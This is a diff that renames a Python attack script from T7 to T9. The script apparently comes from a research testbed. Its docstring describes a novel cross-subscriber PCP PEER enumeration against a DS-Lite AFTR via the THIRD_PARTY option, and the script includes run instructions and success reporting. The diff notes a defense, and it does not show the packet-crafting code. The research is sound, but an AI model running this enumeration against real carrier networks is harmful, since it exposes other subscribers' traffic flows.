@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""T7: Cross-Subscriber PCP PEER Enumeration via THIRD_PARTY.
+"""T9: Cross-Subscriber PCP PEER Enumeration via THIRD_PARTY.
 
 NOVEL attack discovered in this work. Demonstrates that the AFTR's
 PCP PEER handler accepts an attacker-supplied THIRD_PARTY option
@@ -21,7 +21,7 @@ Defense:
              requests where int_ip does not belong to client_addr6's B4.
 
 Run inside the testbed container:
-  docker exec dslite python3 /testbed/attack_tools/infra/t7_peer_crosssub.py
+  docker exec dslite python3 /testbed/attack_tools/infra/t9_peer_crosssub.py
 """
 import argparse, os, socket, struct, subprocess, sys, time
 import re
@@ -154,7 +154,7 @@ def aftr_victim_flows() -> dict:
 
 def run_t10(n_victim_flows: int = 3, brute_window: int = 100,
             verbose: bool = True) -> dict:
-    """Run one trial of T7.
+    """Run one trial of T9.
 
     Returns a dict with measurement results that AttackResult can
     consume.
@@ -176,7 +176,7 @@ def run_t10(n_victim_flows: int = 3, brute_window: int = 100,
     time.sleep(1)
 
     if verbose:
-        print(f"[T7] spawning {n_victim_flows} persistent victim flows ...")
+        print(f"[T9] spawning {n_victim_flows} persistent victim flows ...")
     victims = [start_victim_flow(6666) for _ in range(n_victim_flows)]
     # Wait window for the 3-way handshake to complete and the AFTR's
     # softwire-side conntrack to register every victim flow. Under the
@@ -192,7 +192,7 @@ def run_t10(n_victim_flows: int = 3, brute_window: int = 100,
     truth_sports = sorted(truth.keys())
     truth_ext = {extp for (_dport, extp) in truth.values()}
     if verbose:
-        print(f"[T7] ground truth victim sports: {truth_sports}")
+        print(f"[T9] ground truth victim sports: {truth_sports}")
 
     if not truth:
         for v in victims:
@@ -256,7 +256,7 @@ def run_t10(n_victim_flows: int = 3, brute_window: int = 100,
         except Exception: pass
 
     if verbose:
-        print(f"[T7] probes={probes} elapsed={dt:.2f}s wildcard_leak="
+        print(f"[T9] probes={probes} elapsed={dt:.2f}s wildcard_leak="
               f"{wildcard_leak} TP={tp} FP={fp} FN={fn}")
 
     return {"success": tp > 0 and fp == 0,
@@ -279,7 +279,7 @@ def main():
         print("must run as root", file=sys.stderr); sys.exit(1)
 
     print("=" * 64)
-    print("T7 — Cross-Subscriber PCP PEER Enumeration via THIRD_PARTY")
+    print("T9 — Cross-Subscriber PCP PEER Enumeration via THIRD_PARTY")
     print("=" * 64)
     print(f"Attacker netns: {ATTACKER_NETNS}, victim netns: {VICTIM_NETNS}")
     print(f"AFTR IPv6:      {AFTR_IP6}:{PCP_PORT_AFTR}")
@@ -305,15 +305,15 @@ def main():
 
     overall = successes == args.trials
     print()
-    print("===== T7 verdict =====")
+    print("===== T9 verdict =====")
     print(f"trials passed: {successes}/{args.trials}")
     print(f"aggregate TP={all_tp} FP={all_fp} FN={all_fn}, "
           f"precision={all_tp/max(1,all_tp+all_fp):.2%}, "
           f"recall={all_tp/max(1,all_tp+all_fn):.2%}")
     if overall:
-        print("*** T7 SUCCESS: cross-subscriber observation-isolation broken ***")
+        print("*** T9 SUCCESS: cross-subscriber observation-isolation broken ***")
     else:
-        print("T7 not fully reproduced — check victim flow setup or defenses")
+        print("T9 not fully reproduced — check victim flow setup or defenses")
 
 
 if __name__ == "__main__":
